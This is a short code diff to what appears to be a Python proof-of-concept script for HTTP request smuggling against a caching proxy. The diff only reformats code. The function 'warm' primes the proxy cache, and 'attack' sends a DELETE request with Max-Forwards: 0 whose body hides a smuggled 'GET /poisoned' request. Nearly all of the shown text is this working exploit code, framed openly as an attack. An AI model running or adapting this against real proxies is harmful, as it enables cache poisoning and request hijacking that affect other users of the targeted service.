@@ -44,8 +44,7 @@ def parse_args() -> argparse.Namespace:
 
 def warm(address: str, port: int, hostname: str) -> None:
     """Fetch '/' so the proxy caches it."""
-    req = (f"GET / HTTP/1.1\r\nHost: {hostname}\r\n"
-           f"Connection: close\r\n\r\n").encode()
+    req = (f"GET / HTTP/1.1\r\nHost: {hostname}\r\nConnection: close\r\n\r\n").encode()
     with socket.create_connection((address, port), timeout=8) as s:
         s.sendall(req)
         s.settimeout(8)
@@ -60,9 +59,9 @@ def warm(address: str, port: int, hostname: str) -> None:
 def attack(address: str, port: int, hostname: str) -> bytes:
     """Send DELETE / (Max-Forwards: 0) whose body is a smuggled request."""
     smuggled = (f"GET /poisoned HTTP/1.1\r\nHost: {hostname}\r\n\r\n").encode()
-    req = (f"DELETE / HTTP/1.1\r\nHost: {hostname}\r\n"
-           f"Max-Forwards: 0\r\n"
-           f"Content-Length: {len(smuggled)}\r\n\r\n").encode() + smuggled
+    req = (
+        f"DELETE / HTTP/1.1\r\nHost: {hostname}\r\nMax-Forwards: 0\r\nContent-Length: {len(smuggled)}\r\n\r\n"
+    ).encode() + smuggled
     with socket.create_connection((address, port), timeout=8) as s:
         s.sendall(req)
         s.settimeout(3)
